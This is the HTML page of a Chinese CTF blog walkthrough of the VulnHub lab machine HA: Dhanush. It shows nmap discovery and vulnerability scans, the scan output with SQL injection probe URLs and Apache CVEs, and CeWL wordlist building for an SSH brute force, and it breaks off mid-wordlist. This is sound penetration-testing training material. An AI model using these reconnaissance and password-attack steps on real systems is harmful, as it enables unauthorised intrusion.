@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称：HA：Dhanush发布日期：2019年11月9日 级别：中级任务：枚举目标计算机并获得root用户访问权限。 下载：  Download: https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L&#x2F;view?usp&#x3D;sharing Download (Mirror): https:&#x2F;&#x2F;download.vulnhub">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[HA-Dhanush]">
+<meta property="og:url" content="https://fdlucifer.github.io/2019/12/17/HA-Dhanush/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称：HA：Dhanush发布日期：2019年11月9日 级别：中级任务：枚举目标计算机并获得root用户访问权限。 下载：  Download: https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L&#x2F;view?usp&#x3D;sharing Download (Mirror): https:&#x2F;&#x2F;download.vulnhub">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2019-12-17T06:00:09.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:50:10.201Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2019/12/17/HA-Dhanush/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/17/HA-Dhanush/","path":"2019/12/17/HA-Dhanush/","title":"vulnhub靶机渗透[HA-Dhanush]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[HA-Dhanush] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4ssh%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">爆破ssh的用户名和密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/17/HA-Dhanush/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[HA-Dhanush] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[HA-Dhanush]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2019-12-17 14:00:09" itemprop="dateCreated datePublished" datetime="2019-12-17T14:00:09+08:00">2019-12-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:50:10" itemprop="dateModified" datetime="2020-08-17T00:50:10+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>名称：HA：Dhanush<br>发布日期：2019年11月9日</p>
+<p>级别：中级<br>任务：枚举目标计算机并获得root用户访问权限。</p>
+<p>下载：</p>
+<ul>
+<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQmZPdnJySXFrVmVlRWh2M2o3eUFTS21WTnctODRzM0wvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcA==">https://download.vulnhub.com/ha/dhanush.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcC50b3JyZW50">https://download.vulnhub.com/ha/dhanush.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>描述：</p>
+<p>Dhanush曾经是武器技术的巅峰之作。 它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。<br>选择你的Dhanush，拉伸琴弦并射击以获取root！枚举是关键！！！！有关印度神话和弓箭的一些信息可能会有所帮助。</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.131</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:66:8B (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.131</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|     Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_    Couldn&#x27;</span>t find a file-type field.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A 192.168.142.131</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: HA: Dhanush</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e3:2f:3d:<span class="built_in">dd</span>:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)</span><br><span class="line">|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)</span><br><span class="line">|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)</span><br></pre></td></tr></table></figure>
+
+<p>现在，在进一步之前，此网页可能包含Dhanush的大量信息。 同样，这些可能是用户名或密码。 因此，决定使用cewl命令制作字典。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl http://192.168.142.131/ -w dict1.txt</span></span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@kali:~<span class="comment"># cat dict1.txt </span></span><br><span class="line">Dhanush</span><br><span class="line">धनष</span><br><span class="line">Lord</span><br><span class="line">Feature</span><br><span class="line">Wielded</span><br><span class="line">the</span><br><span 